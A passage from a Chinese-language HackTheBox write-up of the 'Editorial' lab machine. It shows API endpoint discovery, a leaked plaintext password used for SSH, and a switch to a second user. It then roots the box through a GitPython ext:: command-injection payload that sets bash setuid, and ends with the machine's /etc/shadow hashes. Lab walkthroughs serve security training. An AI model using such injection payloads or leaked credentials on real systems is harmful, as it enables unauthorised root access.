library.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/promos&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;coupons&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve the list of coupons to use in our library.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/coupons&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;new_authors&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve the welcome message sended to our new authors.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/authors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;platform_use&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve examples of how to use the platform.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/how_to_use_platform&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;changelog&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve a list of all the versions and updates of the api.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/changelog&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;latest&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve the last version of api.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看來是個api服務器，用 jq 快速過濾下 <code>endpoint</code>​ ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://editorial.htb/static/uploads/ad7a5814-<span class="number">9163</span>-4ced-<span class="number">8838</span>-ac19cd53b8e9 | jq | grep endpoint</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/promos&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/coupons&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/authors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/how_to_use_platform&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/changelog&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata&quot;</span>,</span><br></pre></td></tr></table></figure>
+
+<p>然後一個一個試，因爲只有六個而已，沒必要寫工具了。</p>
+<p>然後世道第三個的時候看到有一個賬號密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170148-saqdkez.png" alt="image">​</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev: dev080217_devAPI!@</span><br></pre></td></tr></table></figure>
+
+<p>嘗試登錄ssh，結果進去了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dev@editorial:~$ ls</span><br><span class="line">apps  user.txt</span><br><span class="line"></span><br><span class="line">dev@editorial:~$ cd apps/</span><br><span class="line">dev@editorial:~/apps$ ls</span><br><span class="line"></span><br><span class="line">dev@editorial:~/apps$ ls -la</span><br><span class="line">total <span class="number">12</span></span><br><span class="line">drwxrwxr-x <span class="number">3</span> dev dev <span class="number">4096</span> Jun  <span class="number">5</span> <span class="number">14</span>:<span class="number">36</span> .</span><br><span class="line">drwxr-x--- <span class="number">4</span> dev dev <span class="number">4096</span> Jun  <span class="number">5</span> <span class="number">14</span>:<span class="number">36</span> ..</span><br><span class="line">drwxr-xr-x <span class="number">8</span> dev dev <span class="number">4096</span> Jun  <span class="number">5</span> <span class="number">14</span>:<span class="number">36</span> .git</span><br></pre></td></tr></table></figure>
+
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>可以看到app裏面有一個 <code>.git</code>​ 藏起來了。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170547-a7hr4wn.png" alt="image">​</p>
+<p>然後看看git的歷史記錄，看到了 prod， <code>cat /etc/passwd</code>​ 也看到prod這個用戶：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170612-5ho4rec.png" alt="image">​</p>
+<p>所以嘗試su過去看看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">dev@editorial:~/apps$ su prod</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">prod@editorial:/home/dev/apps$ <span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1000</span>(prod) gid=<span class="number">1000</span>(prod) groups=<span class="number">1000</span>(prod)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 結果成功了，隨手 sudo -l 看看：</span></span><br><span class="line">prod@editorial:/home/dev/apps$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> prod: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> prod on editorial:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span>\:/snap/<span class="built_in">bin</span>, use_pty</span><br><span class="line"></span><br><span class="line">User prod may run the following commands on editorial:</span><br><span class="line">    (root) /usr/<span class="built_in">bin</span>/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以看到是調用python3的脚本，看看這個脚本有什麽：</span></span><br><span class="line">prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py</span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> git <span class="keyword">import</span> Repo</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;/opt/internal_apps/clone_changes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url_to_clone = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">r = Repo.init(<span class="string">&#x27;&#x27;</span>, bare=<span class="literal">True</span>)</span><br><span class="line">r.clone_from(url_to_clone, <span class="string">&#x27;new_changes&#x27;</span>, multi_options=[<span class="string">&quot;-c protocol.ext.allow=always&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>脚本原來是模擬簡單的gitclone，所以應該是某個軟件包，因爲沒有git.py 這個文件在目錄裏面。</p>
+<p>pip3 查一下軟件包的版本，搜索 git 看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170747-5v17gtb.png" alt="image">​</p>
+<p>有兩個</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gitdb                 <span class="number">4.0</span><span class="number">.10</span></span><br><span class="line">GitPython             <span class="number">3.1</span><span class="number">.29</span></span><br></pre></td></tr></table></figure>
+
+<p>於是查了一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170821-dburna0.png" alt="image">​</p>
+<p>看到了這篇文章： <a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858</a></p>
+<p>可以看到poc和這個脚本非常相似</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616171021-eqhnm8b.png" alt="image">​</p>
+<p>這個poc告訴你它可以執行代碼，所以根據poc，把bash加上suid的權限：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /usr/<span class="built_in">bin</span>/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="string">&#x27;ext::sh -c chmod% 4777% /bin/bash&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然後得到root：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616171248-au81j5h.png" alt="image">​</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$PNijPFzQRd1/Yx6sr4HqS.$ITtQp.k4TN0RY1ADcvcSb.b9UcxD6Jx0MDNL3odgsV9:<span class="number">19878</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">bin</span>:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sys:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">man:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lp:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">news:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uucp:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">proxy:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">www-data:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">backup:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">list</span>:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">irc:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">gnats:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_apt:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-network:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-resolve:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">messagebus:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-timesync:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">pollinate:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sshd:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">syslog:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uuidd:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">tcpdump:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">tss:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">landscape:*:<span class="number">19213</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">usbmux:*:<span class="number">19385</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">prod:$y$j9T$bQEMwg1M5mDlBp9UM9YAM0$y8V8Rl64myknJa31Tzt/x9hQpzavDce2vGK9K8y316.:<span class="number">19394</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lxd:!:<span class="number">19385</span>::::::</span><br><span class="line">dev:$y$j9T$KcdXrIRoJN69I1Ez4Zx1B/$Jc/EJctFUl4/PaL2RvwUWccq5zC4ep2KtIhMDtbTdn6:<span class="number">19390</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">fwupd-refresh:*:<span class="number">19878</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_laurel:!:<span class="number">19879</span>::::::</span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&text=HackTheBox - Machine - Editorial"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&is_video=false&description=HackTheBox - Machine - Editorial"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Editorial&body=Check out this article: https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&name=HackTheBox - Machine - Editorial&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&t=HackTheBox - Machine - Editorial"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
